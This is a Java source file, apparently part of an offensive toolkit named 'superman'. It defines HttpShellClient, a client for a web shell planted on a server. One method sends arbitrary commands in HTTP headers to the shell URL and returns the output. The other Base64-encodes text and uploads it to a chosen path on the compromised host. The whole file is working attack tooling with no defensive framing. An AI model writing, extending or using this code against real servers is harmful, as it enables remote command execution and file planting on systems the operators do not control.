package superman.core;

import sun.misc.BASE64Encoder;
import superman.util.HttpClient;

import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.util.HashMap;
import java.util.Map;

public class HttpShellClient {
    public static String exec(String shellUrl,String cmd) throws Exception {
        Map<String,String> headers=new HashMap<String, String>();
        headers.put("type","exec");
        headers.put("cmd",cmd);
        return HttpClient.get(shellUrl,headers).getData().trim();
    }
    public static void upload(String shellUrl,String uploadPath,String text) throws Exception {
        Map<String,String> headers=new HashMap<String, String>();
        headers.put("type","upload");
        headers.put("path", uploadPath);
        String s=null;
        try {
            s= URLEncoder.encode(new BASE64Encoder().encode(text.getBytes()),"utf-8");
        } catch (UnsupportedEncodingException e) {
            //e.printStackTrace();
        }
        headers.put("text", s);
        HttpClient.post(shellUrl,"a=b".getBytes(),headers);
    }
}
